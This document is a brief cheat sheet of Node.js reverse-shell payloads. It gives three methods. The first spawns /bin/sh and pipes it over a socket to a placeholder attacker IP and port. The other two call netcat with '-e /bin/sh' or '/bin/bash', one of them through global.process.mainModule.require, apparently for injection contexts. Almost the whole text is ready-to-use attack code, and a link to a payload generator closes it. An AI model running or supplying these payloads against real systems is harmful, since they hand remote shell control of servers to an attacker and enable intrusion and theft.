# NodeJS

## Method 1

```javascript
(function() {
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(<PORT>, "<IP>", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

## Method 2

```javascript
require('child_process').exec('nc -e /bin/sh <attacker_IP> <LPORT>')
```

## Method 3

```javascript
var x = global.process.mainModule.require
x('child_process').exec('nc <attacker_IP> <LPORT> -e /bin/bash')
```

---
## References

- [JSgen](https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py)